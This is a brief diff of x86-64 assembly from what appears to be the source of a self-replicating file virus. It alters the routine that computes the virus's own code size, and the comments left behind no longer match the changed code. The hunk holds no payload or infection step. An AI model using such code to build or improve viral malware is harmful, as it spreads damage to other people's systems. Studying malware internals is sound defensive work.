@@ -231,8 +231,8 @@ _unlink:
 
 ; calcul virus size
 	xor r10, r10 ; r10 = 0
-	lea r10, [rel _final_end] ; r10 = &_final_end
-	add r10, 2 ; final_end have 2 bytes of instrucitions
+	lea r10, [rel _padding] ; r10 = &_final_end
+;	add r10, 2 ; final_end have 2 bytes of instrucitions
 	xor r11, r11
 	lea r11, [rel _string] ; r11 = &_string
 	sub r10, r11 ; &_final_end -= &_string
